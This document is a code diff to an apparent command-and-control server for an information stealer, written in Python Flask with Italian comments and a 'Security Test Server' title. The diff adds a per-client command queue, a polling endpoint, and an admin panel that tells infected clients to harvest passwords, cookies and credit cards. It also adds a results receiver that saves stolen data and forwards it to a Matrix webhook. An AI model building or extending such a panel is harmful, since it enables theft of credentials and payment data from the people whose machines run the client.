@@ -5,6 +5,7 @@ import json
 import requests
 from datetime import datetime
 import logging
+import os
 
 app = Flask(__name__)
 
@@ -17,14 +18,15 @@ class ClientManager:
         self.clients = {}
         self.next_client_id = 1
         self.lock = threading.Lock()
+        self.commands_queue = {}  # 🆕 Coda comandi per client
     
-    def add_client(self, client_data):
+    def add_client(self, client_data, ip_address):
         with self.lock:
             client_id = self.next_client_id
             self.clients[client_id] = {
                 "data": client_data,
                 "last_seen": datetime.now(),
-                "ip": request.remote_addr
+                "ip": ip_address
             }
             self.next_client_id += 1
             return client_id
@@ -33,6 +35,8 @@ class ClientManager:
         with self.lock:
             if client_id in self.clients:
                 del self.clients[client_id]
+            if client_id in self.commands_queue:
+                del self.commands_queue[client_id]
     
     def get_client(self, client_id):
         with self.lock:
@@ -41,6 +45,20 @@ class ClientManager:
     def list_clients(self):
         with self.lock:
             return self.clients.copy()
+    
+    def add_command(self, client_id, command):
+        """🆕 Aggiungi comando alla coda per un client"""
+        with self.lock:
+            if client_id not in self.commands_queue:
+                self.commands_queue[client_id] = []
+            self.commands_queue[client_id].append(command)
+    
+    def get_command(self, client_id):
+        """🆕 Prendi il prossimo comando per un client"""
+        with self.lock:
+            if client_id in self.commands_queue and self.commands_queue[client_id]:
+                return self.commands_queue[client_id].pop(0)
+            return None
 
 client_manager = ClientManager()
 
@@ -55,25 +73,73 @@ def send_to_matrix(message, data_type="SERVER"):
             "Authorization": f"Bearer {MATRIX_TOKEN}",
             "Content-Type": "application/json"
         }
-        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers)
+        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers, timeout=10)
     except Exception as e:
         print(f"Matrix error: {e}")
 
 @app.route('/')
 def home():
-    return """
+    clients_count = len(client_manager.list_clients())
+    return f"""
     <h1>Security Test Server</h1>
-    <p>Server attivo su Render + Matrix</p>
-    <p>Client connessi: {}</p>
-    <a href="/clients">View Clients</a>
-    """.format(len(client_manager.list_clients()))
+    <p>PythonAnywhere + Matrix</p>
+    <p>Client connessi: {clients_count}</p>
+    <p><a href="/admin">Admin Panel</a></p>
+    <p><a href="/clients">View Clients</a></p>
+    """
+
+@app.route('/admin')
+def admin_panel():
+    """🆕 Interfaccia admin per inviare comandi"""
+    clients = client_manager.list_clients()
+    clients_html = ""
+    for client_id, info in clients.items():
+        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
+    
+    return f'''
+    <h2>Admin Control Panel</h2>
+    <form action="/send_command" method="post">
+        <label>Select Client:</label>
+        <select name="client_id">
+            {clients_html}
+        </select><br><br>
+        
+        <label>Command:</label>
+        <select name="command">
+            <option value="passwords">Get Passwords</option>
+            <option value="cookies">Get Cookies</option>
+            <option value="cards">Get Credit Cards</option>
+            <option value="systeminfo">System Info</option>
+        </select><br><br>
+        
+        <button type="submit">Send Command</button>
+    </form>
+    <p><a href="/clients">View All Clients</a></p>
+    '''
+
+@app.route('/send_command', methods=['POST'])
+def send_command_web():
+    """🆕 Versione web per comandi"""
+    client_id = request.form.get('client_id')
+    command = request.form.get('command')
+    
+    if client_id and command:
+        client_manager.add_command(int(client_id), command)
+        send_to_matrix(f"🌐 Comando web '{command}' per client {client_id}")
+    
+    return f'''
+    <h3>Command Sent!</h3>
+    <p>Command: {command} to Client: {client_id}</p>
+    <a href="/admin">Back to Admin</a>
+    '''
 
 @app.route('/api/register', methods=['POST'])
 def register_client():
     """Client si registra al server"""
     try:
         client_data = request.json
-        client_id = client_manager.add_client(client_data)
+        client_ip = request.remote_addr
+        client_id = client_manager.add_client(client_data, client_ip)
         
         send_to_matrix(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
         
@@ -85,9 +151,29 @@ def register_client():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
+@app.route('/api/check_commands', methods=['GET'])
+def check_commands():
+    """🆕 Endpoint per check comandi - richiesto dal client"""
+    try:
+        client_id = request.args.get('client_id')
+        
+        if not client_id:
+            return jsonify({"status": "error", "message": "client_id required"})
+        
+        command = client_manager.get_command(int(client_id))
+        
+        return jsonify({
+            "status": "success",
+            "command": command,  # None se nessun comando
+            "message": "Command check completed"
+        })
+        
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
 @app.route('/api/command', methods=['POST'])
-def send_command():
-    """Invia comando a client specifico"""
+def send_command_api():
+    """Invia comando a client specifico via API"""
     try:
         data = request.json
         client_id = data.get('client_id')
@@ -97,8 +183,7 @@ def send_command():
         if not client:
             return jsonify({"status": "error", "message": "Client not found"})
         
-        # Qui il client dovrebbe periodicamente pollare per comandi
-        # Per ora simuliamo l'esecuzione
+        client_manager.add_command(client_id, command)
         send_to_matrix(f"📡 Comando '{command}' per client {client_id}")
         
         return jsonify({
@@ -154,7 +239,7 @@ def receive_results():
         command = data.get('command')
         results = data.get('results')
         
-        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:200]}...")
+        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:500]}...")
         
         # Salva risultati
         filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
@@ -167,5 +252,6 @@ def receive_results():
         return jsonify({"status": "error", "message": str(e)})
 
 if __name__ == '__main__':
-    send_to_matrix("🚀 Server Flask avviato su Render")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get('PORT', 5000))
+    send_to_matrix("🚀 Server Flask avviato su PythonAnywhere")
+    app.run(host='0.0.0.0', port=port, debug=False)
